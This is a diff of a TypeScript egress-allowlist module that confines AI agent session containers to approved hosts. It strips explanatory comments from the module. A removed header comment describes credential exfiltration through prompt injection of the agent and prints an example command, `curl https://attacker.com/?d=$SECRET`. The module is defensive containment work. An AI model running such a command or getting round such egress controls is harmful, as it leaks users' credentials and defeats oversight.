@@ -1,190 +1,63 @@
-/**
- * Egress allowlist — the set of hostnames a session container is permitted to
- * reach through the orchestrator-controlled forward proxy (`egress-proxy.ts`).
- *
- * docs/172-agent-containment Gap 1 (planning#92). Session containers hold real
- * credentials (the pinned agent's OAuth/subscription token, MCP tokens, the
- * brokered GitHub PAT) and, by product design, run with minimal human-in-the-
- * loop friction. The load-bearing backstop against credential exfiltration via
- * direct prompt injection is **default-deny egress with a narrow allowlist**:
- * the agent can reach the hosts it legitimately needs (its own API, the git
- * host, package registries, the user's configured MCP servers) and nothing
- * else, so `curl https://attacker.com/?d=$SECRET` has nowhere to go.
- *
- * This module owns the *allowlist*; the *enforcement* (CONNECT/HTTP proxy that
- * answers 403 for a denied host) lives in `egress-proxy.ts`. Keeping them split
- * means the matcher is a pure, exhaustively-testable function with no sockets.
- *
- * Matching rules (`hostMatches`):
- *   - An entry beginning with "." (e.g. ".github.com") is a **suffix** match:
- *     it matches that domain AND any subdomain ("github.com", "api.github.com").
- *   - Any other entry is an **exact** hostname match.
- * Host comparison is case-insensitive and ignores a single trailing dot
- * (FQDN form "github.com.").
- */
-
 import type { CredentialStore } from "./credential-store.js";
 import type { EgressAllowlistEntry, EgressAllowlistSource, SessionInfo } from "../shared/types.js";
 import { getMcpOAuthProvider } from "./mcp-oauth-providers.js";
 
-// ---------------------------------------------------------------------------
-// Default base allowlist — the hosts every session legitimately needs
-// ---------------------------------------------------------------------------
-
-/**
- * The always-on base allowlist. Grouped by purpose so it's obvious why each
- * host is here and what removing it would break. Suffix entries (".x.com")
- * cover the family of subdomains a service spreads its traffic across (CDNs,
- * regional shards, telemetry) without enumerating every one.
- *
- * Operators extend this per-deployment via `SESSION_EGRESS_ALLOWLIST` (see
- * `parseAllowlistEnv`); MCP server hosts are added dynamically from the
- * credential store (see `mcpHostsFromCredentialStore`).
- */
 export const EGRESS_DEFAULT_ALLOWLIST: readonly string[] = [
-  // --- Agent API endpoints (Claude / Anthropic) ---
-  ".anthropic.com", // api.anthropic.com (inference), console.anthropic.com (OAuth), statsig.anthropic.com
-  ".claude.ai", // claude.ai OAuth / subscription endpoints
-  "platform.claude.com", // Claude Code subscription authentication; exact host keeps other claude.com services closed
-  // --- Agent API endpoints (Codex / OpenAI) ---
-  ".openai.com", // api.openai.com, auth.openai.com
-  ".chatgpt.com", // chatgpt.com (Codex subscription auth)
-  // --- Catalogue provider API endpoints ---
-  // Exact hosts preserve the default-deny boundary: these services need their
-  // inference endpoint, not arbitrary sibling subdomains.
-  "api.deepseek.com",
-  "api.z.ai",
-  "openrouter.ai",
-  "ai-gateway.vercel.sh",
-  // docs/272 — OpenCode Zen and OpenCode Go both serve from this one host
-  // (`/zen/v1`, `/zen/go/v1`), so one exact entry covers the service's two
-  // billing modes. NOT ".opencode.ai": the suffix would also open the console,
-  // and inference is what a session needs.
-  "opencode.ai",
-  // docs/274 — xAI's inference endpoint, the `grok` harness's KEY-billed mode.
-  // EXACT host, never ".x.ai": the suffix would open the marketing site and
-  // every other x.ai service, and inference is what a session needs.
-  "api.x.ai",
-  // planning#435 — the two hosts Grok's SUBSCRIPTION mode needs, each its own
-  // exact host for the same reason. Both are here because they were observed
-  // in use, not because the binary mentions them:
-  //   - `auth.x.ai` serves the OIDC device-code flow (`grok login
-  //     --device-auth` POSTs `/oauth2/device/code`) AND the refresh — the
-  //     token is short-lived (6h observed), so a long session re-reaches this
-  //     host mid-turn, which is why it cannot be a login-time-only grant.
-  //   - `cli-chat-proxy.grok.com` is where subscription turns actually go:
-  //     `GET /v1/models` returns a catalogue disjoint from the key mode's, and
-  //     every recorded turn POSTs `/v1/responses` there.
-  // Note `accounts.x.ai` is deliberately ABSENT: it serves the page the user
-  // approves the device code on, which their own browser loads. The container
-  // never fetches it.
-  "auth.x.ai",
-  "cli-chat-proxy.grok.com",
-
-  // --- Git host ---
-  // ShipIt only authenticates against GitHub today (see docs/172 Gap 2). The
-  // suffix covers github.com, api.github.com, codeload.github.com.
-  ".github.com",
-  ".githubusercontent.com", // raw.githubusercontent.com, objects.githubusercontent.com (release/LFS assets)
-  ".githubassets.com",
-  // docs/231 — Git LFS transfers. GitHub's LFS batch API hands back signed URLs
-  // on `objects.githubusercontent.com` (covered above) OR on this S3 bucket,
-  // depending on repo and API vintage; without it `git lfs pull` (assets check
-  // out as pointer stubs) and `git lfs push` (an agent committing a new tracked
-  // binary) fail in a sandboxed session. EXACT host, never ".amazonaws.com" —
-  // the bare suffix would open every S3 bucket on the internet as an exfil
-  // target. This one bucket is signed-URL-gated, so it's read/write only for
-  // objects GitHub already authorized for this repo.
-  "github-cloud.s3.amazonaws.com",
-
-  // --- Package registries ---
-  ".npmjs.org", // registry.npmjs.org
-  ".npmjs.com",
-  ".yarnpkg.com", // registry.yarnpkg.com
-  ".pypi.org", // pypi.org
-  ".pythonhosted.org", // files.pythonhosted.org (wheel downloads)
-  ".nodejs.org", // nodejs.org — node-gyp downloads the Node headers tarball (npm `disturl`) here to compile native modules (node-pty, etc.)
-
-  // --- JVM / Android build artifact registries (docs/213) ---
-  // The JVM analog of the npm/pypi entries above: Gradle/Maven resolve build
-  // dependencies (AGP, Kotlin, AndroidX) from these. Required for the baked
-  // Android toolchain to actually build — without them every `./gradlew` fails
-  // at dependency resolution with UnknownHostException. All are read-only
-  // artifact CDNs (you GET jars/poms/dists), so they don't widen the exfil
-  // surface the way a content-host would — same posture as npm/pypi.
-  ".gradle.org", // services.gradle.org (wrapper distributions), plugins.gradle.org (plugin portal)
-  // EXACT, never ".google.com": the bare suffix would re-open Gmail/Drive/Forms
-  // (real exfil channels). dl.google.com is a download-only artifact host.
-  "dl.google.com", // Google Maven (AGP, AndroidX) + on-demand sdkmanager package downloads
-  "maven.google.com", // Google Maven index / redirects
-  ".maven.apache.org", // repo.maven.apache.org — Maven Central (Gradle's mavenCentral() default)
-  ".maven.org", // repo1.maven.org — Maven Central canonical / CDN alias
-  ".sonatype.org", // oss.sonatype.org, s01.oss.sonatype.org — common snapshot + transitive source
-];
-
-/**
- * docs/211 — the **lifeline** allowlist: the irreducible hosts a contained
- * agent must reach for the loop to function at all — its inference/auth API.
- * Used when a sandbox session's `network` capability is OFF: egress is dropped
- * to this set (plus the ShipIt orchestrator/worker, which the resolver/proxy add
- * separately via {@link orchestratorInternalNames}, and plus GitHub when the
- * `git` capability is granted — see {@link EGRESS_GITHUB_LIFELINE_HOSTS}).
- *
- * This is the LLM-API slice of {@link EGRESS_DEFAULT_ALLOWLIST} — registries and
- * the git host are deliberately excluded ("no internet, lifeline only"). Cutting
- * these hosts would kill the agent, so "off" is lifeline-only, never a literal
- * air-gap.
- */
-export const EGRESS_LIFELINE_ALLOWLIST: readonly string[] = [
-  // --- Agent API endpoints (Claude / Anthropic) ---
   ".anthropic.com",
   ".claude.ai",
   "platform.claude.com",
-  // --- Agent API endpoints (Codex / OpenAI) ---
   ".openai.com",
   ".chatgpt.com",
-  // --- Catalogue provider API endpoints ---
   "api.deepseek.com",
   "api.z.ai",
   "openrouter.ai",
   "ai-gateway.vercel.sh",
   "opencode.ai",
   "api.x.ai",
-  // planning#435 — Grok's subscription mode. `cli-chat-proxy.grok.com` is an
-  // inference endpoint, so it belongs in the lifeline on the same footing as
-  // `api.x.ai`. `auth.x.ai` is here for a different reason: the subscription
-  // token expires in ~6h and refreshes against it, so a Network-off session
-  // that could reach inference but not the refresh would die partway through
-  // rather than at the start — the failure mode a lifeline exists to prevent.
+  "auth.x.ai",
+  "cli-chat-proxy.grok.com",
+  ".github.com",
+  ".githubusercontent.com",
+  ".githubassets.com",
+  "github-cloud.s3.amazonaws.com", // Git LFS; keep this bucket exact.
+  ".npmjs.org",
+  ".npmjs.com",
+  ".yarnpkg.com",
+  ".pypi.org",
+  ".pythonhosted.org",
+  ".nodejs.org",
+  ".gradle.org",
+  "dl.google.com",
+  "maven.google.com",
+  ".maven.apache.org",
+  ".maven.org",
+  ".sonatype.org",
+];
+
+// Network-off sessions still need inference and token refresh.
+export const EGRESS_LIFELINE_ALLOWLIST: readonly string[] = [
+  ".anthropic.com",
+  ".claude.ai",
+  "platform.claude.com",
+  ".openai.com",
+  ".chatgpt.com",
+  "api.deepseek.com",
+  "api.z.ai",
+  "openrouter.ai",
+  "ai-gateway.vercel.sh",
+  "opencode.ai",
+  "api.x.ai",
   "auth.x.ai",
   "cli-chat-proxy.grok.com",
 ];
 
-/**
- * docs/211 — GitHub hosts spliced into the lifeline base when a Network-off
- * sandbox ALSO has the `git` capability, so `git push` / PR brokering keep
- * working even with the internet otherwise sealed. GitHub access controls the
- * *token*; Network controls *everything else* — granting git re-opens just this
- * host. Mirrors the git slice of {@link EGRESS_DEFAULT_ALLOWLIST}.
- */
 export const EGRESS_GITHUB_LIFELINE_HOSTS: readonly string[] = [
   ".github.com",
   ".githubusercontent.com",
   ".githubassets.com",
-  // docs/231 — `git push` in an LFS repo is a two-leg operation: refs to
-  // github.com, then the objects themselves to the LFS transfer host. Omitting
-  // this would let a Network-off + git-capable sandbox push refs that point at
-  // LFS objects the remote never received. See EGRESS_DEFAULT_ALLOWLIST for why
-  // the exact bucket host (not ".amazonaws.com") is the safe form.
   "github-cloud.s3.amazonaws.com",
 ];
 
-/**
- * docs/211 — compose the lifeline egress base for a Network-off sandbox: the LLM
- * API lifeline, plus GitHub when `git` is granted. The orchestrator/worker
- * internal names are added separately by the resolver/proxy, so they are always
- * reachable and not listed here. Returns a fresh array (safe to mutate).
- */
 export function sandboxLifelineBase(opts: { git: boolean }): string[] {
   return [
     ...EGRESS_LIFELINE_ALLOWLIST,
@@ -192,23 +65,13 @@ export function sandboxLifelineBase(opts: { git: boolean }): string[] {
   ];
 }
 
-// ---------------------------------------------------------------------------
-// Host matching
-// ---------------------------------------------------------------------------
-
-/** Normalize a hostname for comparison: lowercase, strip one trailing dot. */
 export function normalizeHost(host: string): string {
   let h = host.trim().toLowerCase();
   if (h.endsWith(".")) h = h.slice(0, -1);
   return h;
 }
 
-/**
- * Does `host` match a single allowlist `entry`?
- *
- * - ".suffix" matches "suffix" and "*.suffix".
- * - anything else is an exact match.
- */
+/** A leading dot matches the domain and its subdomains; other entries match exactly. */
 export function hostMatchesEntry(host: string, entry: string): boolean {
   const h = normalizeHost(host);
   const e = normalizeHost(entry);
@@ -220,20 +83,12 @@ export function hostMatchesEntry(host: string, entry: string): boolean {
   return h === e;
 }
 
-/**
- * A compiled allowlist — `isAllowed(host)` is the single predicate the proxy
- * calls per connection. Construct via {@link buildEgressAllowlist}.
- */
 export interface EgressAllowlist {
-  /** The full, de-duplicated list of entries (for logging / diagnostics). */
   entries: string[];
-  /** True iff `host` matches any entry. */
   isAllowed(host: string): boolean;
 }
 
-/** Build an {@link EgressAllowlist} from an explicit list of entries. */
 export function makeAllowlist(entries: Iterable<string>): EgressAllowlist {
-  // De-dupe (normalized) while preserving readable original casing in `entries`.
   const seen = new Set<string>();
   const kept: string[] = [];
   for (const raw of entries) {
@@ -251,15 +106,6 @@ export function makeAllowlist(entries: Iterable<string>): EgressAllowlist {
   };
 }
 
-// ---------------------------------------------------------------------------
-// Sources: env extras + MCP hosts
-// ---------------------------------------------------------------------------
-
-/**
- * Parse a comma/whitespace-separated `SESSION_EGRESS_ALLOWLIST` value into a
- * list of allowlist entries. Empty/undefined → []. Entries are taken verbatim
- * (a leading "." still means suffix-match), trimmed, and blanks dropped.
- */
 export function parseAllowlistEnv(value: string | undefined): string[] {
   if (!value) return [];
   return value
@@ -268,7 +114,6 @@ export function parseAllowlistEnv(value: string | undefined): string[] {
     .filter(Boolean);
 }
 
-/** Extract the hostname from a URL string; null if unparseable or hostless. */
 export function hostFromUrl(url: string): string | null {
   try {
     const h = new URL(url).hostname;
@@ -278,16 +123,7 @@ export function hostFromUrl(url: string): string | null {
   }
 }
 
-/**
- * Derive the set of MCP server hosts a session is allowed to reach from the
- * credential store:
- *   - the `url` host of every configured HTTP MCP server (enabled or not — a
- *     disabled server the user re-enables mid-session must still resolve), and
- *   - the `mcpUrl` host of every OAuth-connected MCP provider (e.g. Notion).
- *
- * stdio MCP servers run as local child processes and make no outbound
- * connection of their own that we can attribute, so they contribute no host.
- */
+// Include disabled HTTP servers so enabling one mid-session needs no restart.
 export function mcpHostsFromCredentialStore(store: CredentialStore): string[] {
   const hosts = new Set<string>();
 
@@ -309,31 +145,13 @@ export function mcpHostsFromCredentialStore(store: CredentialStore): string[] {
   return [...hosts];
 }
 
-// ---------------------------------------------------------------------------
-// Composition
-// ---------------------------------------------------------------------------
-
 export interface BuildAllowlistOpts {
-  /** Override the base list (defaults to {@link EGRESS_DEFAULT_ALLOWLIST}). */
   base?: readonly string[];
-  /** Operator-supplied extra hosts (e.g. from `SESSION_EGRESS_ALLOWLIST`). */
   extraHosts?: Iterable<string>;
-  /**
-   * Credential store to pull live MCP hosts from. When provided, the resulting
-   * allowlist re-reads it on every `isAllowed` call so a server added/connected
-   * mid-session is reachable without restarting the proxy.
-   */
   credentialStore?: CredentialStore;
 }
 
-/**
- * Compose the effective egress allowlist from the base list, operator extras,
- * and (live) MCP hosts.
- *
- * When a `credentialStore` is supplied the predicate is **dynamic**: MCP hosts
- * are re-derived per call, so connecting a new MCP server takes effect
- * immediately. The static portion (base + extras) is compiled once.
- */
+// MCP hosts are read per connection; entries contains only the static base and extras.
 export function buildEgressAllowlist(opts: BuildAllowlistOpts = {}): EgressAllowlist {
   const base = opts.base ?? EGRESS_DEFAULT_ALLOWLIST;
   const staticPart = makeAllowlist([...base, ...(opts.extraHosts ?? [])]);
@@ -350,36 +168,12 @@ export function buildEgressAllowlist(opts: BuildAllowlistOpts = {}): EgressAllow
   };
 }
 
-// ---------------------------------------------------------------------------
-// Extra-host composition (the single seam fed into BOTH the Tier B resolver
-// config and the Tier C proxy allowlist)
-// ---------------------------------------------------------------------------
-
 export interface ComposeExtraHostsOpts {
-  /** Env to read `SESSION_EGRESS_ALLOWLIST` from (defaults to `process.env`). */
   env?: NodeJS.ProcessEnv;
-  /** Live MCP hosts source (configured HTTP servers + OAuth providers). */
   credentialStore?: CredentialStore;
-  /**
-   * Durable user allowlist hosts for this session — global + per-session, from
-   * `EgressAllowlistStore.effectiveHosts(sessionId)`. Passed in (already
-   * resolved) so this module stays free of a store dependency.
-   */
   durableHosts?: Iterable<string>;
 }
 
-/**
- * Compose the **extra** allowlist hosts (everything ON TOP of the built-in base
- * list) that BOTH the Tier B resolver and the Tier C SNI proxy must honor:
- * operator extras (`SESSION_EGRESS_ALLOWLIST`), live MCP server hosts, and the
- * durable user allowlist (global + per-session).
- *
- * This is the one place the three dynamic sources are merged, so the resolver's
- * `server=`/`ipset=` domain set and the proxy's SNI allowlist can never drift —
- * a host the resolver resolves-and-pins is also one the proxy splices.
- * De-duplicated and normalized; the base list is added separately by each
- * consumer (`buildResolverConfigB64` / `buildProxyAllowed`).
- */
 export function composeEgressExtraHosts(opts: ComposeExtraHostsOpts = {}): string[] {
   const env = opts.env ?? process.env;
   const seen = new Set<string>();
@@ -399,36 +193,17 @@ export function composeEgressExtraHosts(opts: ComposeExtraHostsOpts = {}): strin
   return out;
 }
 
-// ---------------------------------------------------------------------------
-// Identity rules (Phase 2) — SNI-scoped tenant identity for multi-tenant hosts
-// ---------------------------------------------------------------------------
-
-/**
- * A multi-tenant identity rule: on the base `host`, only requests whose SNI
- * carries one of these tenant `identities` are permitted. Mirrors the proxy's
- * `EGRESS_PROXY_IDENTITY_RULES` JSON shape (docker/egress-sidecar/sni-proxy).
- */
 export interface EgressIdentityRule {
   host: string;
   identities: string[];
 }
 
 export interface ComposeIdentityRulesOpts {
-  /** Env to read `SESSION_EGRESS_IDENTITY_RULES` from (defaults to `process.env`). */
   env?: NodeJS.ProcessEnv;
-  /**
-   * Durable identity rules from the **global** Settings store (future: a global
-   * Network-egress editor). Merged AFTER the operator env rules — a later rule
-   * for the same host wins. Passed in already-resolved so this module stays
-   * store-free. Identity scoping is operator/admin-level policy: it resolves from
-   * exactly two layers — the operator env and the global store — and is **not**
-   * keyed per session (unlike the host allowlist's per-session extras). No source
-   * feeds it yet, so today identity rules come from the operator env only.
-   */
+  /** Global rules override operator rules for the same host. */
   durableRules?: Iterable<EgressIdentityRule>;
 }
 
-/** Parse the `SESSION_EGRESS_IDENTITY_RULES` JSON env; `[]` on empty/invalid. */
 function parseIdentityRulesEnv(value: string | undefined): EgressIdentityRule[] {
   if (!value?.trim()) return [];
   let parsed: unknown;
@@ -458,21 +233,7 @@ function parseIdentityRulesEnv(value: string | undefined): EgressIdentityRule[] 
   return rules;
 }
 
-/**
- * Compose the Phase-2 SNI-scoped identity rules into the canonical JSON the
- * Tier C proxy consumes via `EGRESS_PROXY_IDENTITY_RULES`:
- *
- *   [{"host":".s3.amazonaws.com","identities":["my-bucket"]}]
- *
- * Mirrors {@link composeEgressExtraHosts} (operator env + a future global
- * durable source) but for the identity hook rather than the host allowlist —
- * identity rules are global-only, never per-session.
- * Hosts are normalized and de-duplicated (last rule per host wins); rules with
- * no host or no identities are dropped. Malformed env is dropped with a warning
- * — identity scoping is **additive** hardening over the host allowlist, never the
- * floor, so failing open to "no scoping" is the documented Phase-2 default.
- * Returns "" when there are no rules so the caller simply omits the env var.
- */
+// Invalid rules omit identity scoping; the host allowlist still applies.
 export function composeEgressIdentityRules(opts: ComposeIdentityRulesOpts = {}): string {
   const env = opts.env ?? process.env;
   const byHost = new Map<string, EgressIdentityRule>();
@@ -492,59 +253,17 @@ export function composeEgressIdentityRules(opts: ComposeIdentityRulesOpts = {}):
   return out.length ? JSON.stringify(out) : "";
 }
 
-// ---------------------------------------------------------------------------
-// Resolved per-session egress config (the wiring shape)
-// ---------------------------------------------------------------------------
-
-/**
- * Per-session egress runtime config, resolved at container start
- * (`index.ts` `resolveEgressConfig`) and threaded through the container
- * lifecycle into the Tier B resolver + Tier C proxy. A single shared shape so
- * the wiring sites (lifecycle deps, container manager, reload) can't drift.
- */
 export interface ResolvedEgressConfig {
-  /** Whether THIS session is contained (global toggle / per-session override). */
   contained: boolean;
-  /** Composed extra allowlist hosts (operator env + MCP + durable user list). */
   extraHosts: string[];
-  /** Built-in base minus any user-removed defaults. Omitted → full default base. */
+  /** Omitted means the full default base. */
   base?: string[];
-  /**
-   * docs/172 Phase 2 — SNI-scoped tenant identity rules as the proxy's
-   * `EGRESS_PROXY_IDENTITY_RULES` JSON (from {@link composeEgressIdentityRules}).
-   * "" / unset → no identity scoping (the host allowlist still applies).
-   */
   identityRules?: string;
-  /**
-   * This session's policy admits **no user hosts at all** — today only docs/211's
-   * Network-off sandbox, whose `network` capability "only ever tightens, never
-   * loosens" and whose reach is the lifeline, full stop.
-   *
-   * A session-level fact, deliberately not a per-host one, because the two are
-   * opposite answers to the same shape (planning#380). "This host is not in the
-   * config" describes an ORDINARY session's brand-new host — precisely when the
-   * Tier C card should appear and a user grant will work. Here no grant can ever
-   * work: `sandboxLifelineEgressConfig` ignores the allowlist store, so a durable
-   * add is inert and an allow-once decision would widen a session the user sealed.
-   * A reader must ask *this*, not diff the host against the entries, or it will
-   * suppress the allow-once flow for every normal session.
-   */
+  /** No user grant can widen this policy; distinct from an empty extras list. */
   userHostsExcluded?: boolean;
 }
 
-/**
- * docs/211 — the per-session egress config for a **sandbox with `network` OFF**,
- * or `null` for any other session (the caller then takes the normal store-driven
- * path). Network-off drops egress to **lifeline-only**: an empty session
- * allowlist (no user/MCP/operator extras, no full default base) with the base
- * narrowed to the LLM-API lifeline (+ github.com when `git` is granted), and
- * containment forced on — "off" only ever tightens, never loosens. The
- * orchestrator/worker lifeline is added separately by the resolver/proxy
- * (`orchestratorInternalNames`), so it is always reachable and not listed here.
- *
- * Inert where egress enforcement isn't deployed: the firewall install is gated
- * on `egressEnforce && contained`, so this config is simply not consumed there.
- */
+// Internal orchestrator/worker hosts are added by the resolver and proxy.
 export function sandboxLifelineEgressConfig(
   session: Pick<SessionInfo, "kind" | "capabilities"> | undefined,
   identityRules: string,
@@ -555,56 +274,24 @@ export function sandboxLifelineEgressConfig(
     extraHosts: [],
     base: sandboxLifelineBase({ git: session.capabilities.git }),
     ...(identityRules ? { identityRules } : {}),
-    // Stated rather than left to be inferred from the empty extras: a reader
-    // cannot tell "this session drops user hosts" from "this user has added
-    // none", and planning#380 is what guessing cost.
     userHostsExcluded: true,
   };
 }
 
-// ---------------------------------------------------------------------------
-// Effective allowlist with provenance (the Settings editor view)
-// ---------------------------------------------------------------------------
-
-/** Is `host` one of the built-in defaults (exact, normalized match)? */
 export function isBuiltinDefault(host: string): boolean {
   const h = normalizeHost(host);
   return EGRESS_DEFAULT_ALLOWLIST.some((e) => normalizeHost(e) === h);
 }
 
 export interface EffectiveAllowlistOpts {
-  /** Env to read `SESSION_EGRESS_ALLOWLIST` from (defaults to `process.env`). */
   env?: NodeJS.ProcessEnv;
-  /** Override the base list (defaults to {@link EGRESS_DEFAULT_ALLOWLIST}). */
   base?: readonly string[];
-  /** Live MCP hosts source. */
   credentialStore?: CredentialStore;
-  /** Durable user-added global allowlist hosts. */
   globalHosts?: Iterable<string>;
-  /** Durable user-added per-session allowlist hosts. */
   sessionHosts?: Iterable<string>;
-  /**
-   * Built-in defaults the user has removed (suppressed) — skipped from the view.
-   * "Restore defaults" clears these so they reappear.
-   */
   suppressedDefaults?: Iterable<string>;
 }
 
-/**
- * Compose the **effective** allowlist as an ordered, de-duplicated list of
- * entries tagged with provenance — exactly what the session can reach and *why*.
- * Powers the Settings allowlist editor.
- *
- * Built-in defaults are **removable** (the base list is a default the user can
- * override, not a hard floor); a removed default is passed in `suppressedDefaults`
- * and skipped here. Operator (`SESSION_EGRESS_ALLOWLIST`) and MCP hosts are
- * **read-only** — they're derived live from the deployment env / connected MCP
- * servers, not user defaults. User-added entries are removable/editable.
- *
- * Precedence on collision (a host in more than one source keeps its first, most-
- * fundamental classification): builtin → operator → mcp → user-global →
- * user-session. Hosts are normalized; a leading "." (suffix match) is preserved.
- */
 export function buildEffectiveAllowlist(opts: EffectiveAllowlistOpts = {}): EgressAllowlistEntry[] {
   const env = opts.env ?? process.env;
   const base = opts.base ?? EGRESS_DEFAULT_ALLOWLIST;
@@ -620,8 +307,8 @@ export function buildEffectiveAllowlist(opts: EffectiveAllowlistOpts = {}): Egre
   };
 
   for (const h of base) {
-    if (suppressed.has(normalizeHost(h))) continue; // user-removed default
-    push(h, "builtin", true); // defaults are overridable
+    if (suppressed.has(normalizeHost(h))) continue;
+    push(h, "builtin", true);
   }
   for (const h of parseAllowlistEnv(env.SESSION_EGRESS_ALLOWLIST)) push(h, "operator", false);
   if (opts.credentialStore) {
